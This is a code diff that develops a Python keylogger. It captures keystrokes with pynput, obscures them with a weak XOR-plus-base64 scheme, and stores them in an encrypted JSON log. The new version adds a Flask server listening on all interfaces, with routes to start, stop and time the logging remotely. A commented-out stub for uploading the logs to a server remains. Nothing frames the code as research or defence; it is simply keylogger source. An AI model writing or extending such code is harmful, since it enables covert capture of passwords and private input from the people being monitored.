@@ -4,14 +4,18 @@ import threading
 from threading import Thread
 from pynput import keyboard
 import time
-
-from flask import Flask, request
+import json
+from flask import Flask, request, jsonify
 import requests
 
-# app = Flask(_name_)
+app = Flask(__name__)
+
+ENCRYPTED_LOG_FILE = "encrypted_logs.json"
+ENCRYPTION_KEY = "613".encode('utf-8')
+
 
 # url = "https://example.com/upload"
-
+#
 # @app.route('/get_file', methods=['GET'])
 # def upload_file():
 #     with open("encrypted_logs.txt", "rb") as f:
@@ -22,16 +26,46 @@ import requests
 #     print(response.text)
 #     return 'Data received', 200
 
-
-# @app.route('/time_to_run/<value>', methods=['GET'])
-# def process(value):
-#     print(value)
-#     KeyLogger(int(value)).stop_after_time()
-#     return "KeyLogger started listening", 200
+@app.route('/start', methods=['GET'])
+def start():
+    Manager().start_logging()
+    return "KeyLogger started listening", 200
 
 
-ENCRYPTED_LOG_FILE = "encrypted_logs.txt"
-ENCRYPTION_KEY = "613".encode('utf-8')
+@app.route('/stop', methods=['GET'])
+def stop():
+    Manager().stop_logging()
+    return "KeyLogger stopped listening", 200
+
+
+@app.route('/time_to_run/<value>', methods=['GET'])
+def time_to_run(value):
+    if int(value) > 0:
+        Manager().run_time(int(value))
+        return f"KeyLogger started listening for {value} minutes", 200
+    else:
+        return "No runtime received.", 200
+
+
+class JSONFileHandler:
+    @staticmethod
+    def read_logs():
+        try:
+            with open(ENCRYPTED_LOG_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            return {"logs": []}
+
+    @staticmethod
+    def write_log(encrypted_content: str):
+        logs = JSONFileHandler.read_logs()
+        log_entry = {
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M"),
+            "encrypted_content": encrypted_content
+        }
+        logs["logs"].append(log_entry)
+        with open(ENCRYPTED_LOG_FILE, "w", encoding="utf-8") as f:
+            json.dump(logs, f, indent=4)
 
 
 class KeyLogger:
@@ -44,6 +78,7 @@ class KeyLogger:
 
     def start(self, time_to_run: int = 0):
         self.listener.start()
+        print("Starting listening!")
         if time_to_run <= 0:
             while not self.stop_event:
                 time.sleep(60)
@@ -95,15 +130,21 @@ class KeyLogger:
             self.routing = route
 
 
-class Writer:
-    @classmethod
-    def add_writing(cls, encrypted_content: str):
-        log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
-        with open(ENCRYPTED_LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(f"[{log_time}] {encrypted_content}\n")
-
-    def write_to_server(self):
-        pass
+#
+# class FileWriter:
+#     @classmethod
+#     def add_writing(cls, encrypted_content: str):
+#         log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
+#         with open(ENCRYPTED_LOG_FILE, "a", encoding="utf-8") as f:
+#             f.write(f"[{log_time}] {encrypted_content}\n")
+#
+#     @classmethod
+#     def write_to_server(cls):
+#         pass
+#
+#     @classmethod
+#     def read(cls):
+#         with open(ENCRYPTED_LOG_FILE,'br',)
 
 
 class EncryptorDecryptor:
@@ -111,8 +152,7 @@ class EncryptorDecryptor:
     def encrypt(data: str) -> str:
         """Encrypt data using XOR cipher and return base64 string."""
         data_bytes = data.encode('utf-8')
-        encrypted = bytes([data_bytes[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]
-                           for i in range(len(data_bytes))])
+        encrypted = bytes([(data_bytes[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]) for i in range(len(data_bytes))])
         return base64.b64encode(encrypted).decode('utf-8')
 
     @staticmethod
@@ -120,9 +160,9 @@ class EncryptorDecryptor:
         """Decrypt base64 encoded encrypted string."""
         try:
             encrypted_data = base64.b64decode(encrypted_b64)
-            decrypted = bytes([encrypted_data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]
-                               for i in range(len(encrypted_data))])
-            return decrypted.decode('utf-8', errors='replace')
+            decrypted = bytes(
+                [(encrypted_data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]) for i in range(len(encrypted_data))])
+            return decrypted.decode('utf-8')
         except Exception as e:
             print(f"Decryption error: {e}")
             return ""
@@ -131,16 +171,17 @@ class EncryptorDecryptor:
 class Manager:
     def __init__(self):
         self.key_logger = KeyLogger()
-        self.threading_start = threading.Thread(target=self.thread_start)
+        self.threading_start = threading.Thread(target=self.thread_start_logging)
         self.threading_run_time = None
 
-    def stop(self):
+    def stop_logging(self):
         self.key_logger.stop_listen()
 
-    def start(self):
-        self.threading_start.start()
+    def start_logging(self):
+        if not self.threading_start.is_alive():
+            self.threading_start.start()
 
-    def thread_start(self):
+    def thread_start_logging(self):
         self.key_logger.start()  # returns on a
 
     def run_time(self, timer: int):
@@ -152,48 +193,26 @@ class Manager:
 
     @staticmethod
     def encrypt(data: str):
-        encrypted_string = EncryptorDecryptor.encrypt(data)
-        Writer.add_writing(encrypted_string)
+        encrypted_data = EncryptorDecryptor.encrypt(data)
+        JSONFileHandler.write_log(encrypted_data)
 
     @staticmethod
     def decrypt_log_file():
-        """Decrypt and display log file contents."""
-        try:
-            with open(ENCRYPTED_LOG_FILE, "r", encoding="utf-8") as f:
-                for line in f:
-                    line = line.strip()
-                    if not line:
-                        continue
-
-                    timestamp_end = line.find(']')
-                    if timestamp_end == -1:
-                        continue
-
-                    encrypted_content = line[timestamp_end + 2:].strip()
-                    decrypted = EncryptorDecryptor.decrypt(encrypted_content)
-                    print(f"{line[:timestamp_end + 1]} {decrypted}")
-        except FileNotFoundError:
-            print("Log file not found!")
-
-    @staticmethod
-    def write(encrypted_string):
-        Writer.add_writing(encrypted_string)
+        logs = JSONFileHandler.read_logs()
+        for log in logs["logs"]:
+            decrypted = EncryptorDecryptor.decrypt(log["encrypted_content"])
+            print(f"{log['timestamp']} {decrypted}")
 
     def route(self, routing='file'):
         self.key_logger.routing_to_save(routing)
 
 
-# if _name_ == '_main_':
-# app.run(host='0.0.0.0', port=5000)
-#
-# m = Manager()
-# m.run_time(1)
+if __name__ == '__main__':
+    Manager.decrypt_log_file()
+    app.run(host='0.0.0.0', port=5000)
 
-# m.stop()
-Manager.decrypt_log_file()
-#
-# KeyLogger(10).stop_after_time()
-#
-# decrypt = input("Decrypt the file? (y/n): ")
-# if decrypt.lower() == 'y':
-#     EncryptorDecryptor.decrypt("encrypted_logs.txt")
+    # m = Manager()
+    # m.run_time(1)
+
+    # m.stop()
+    Manager.decrypt_log_file()
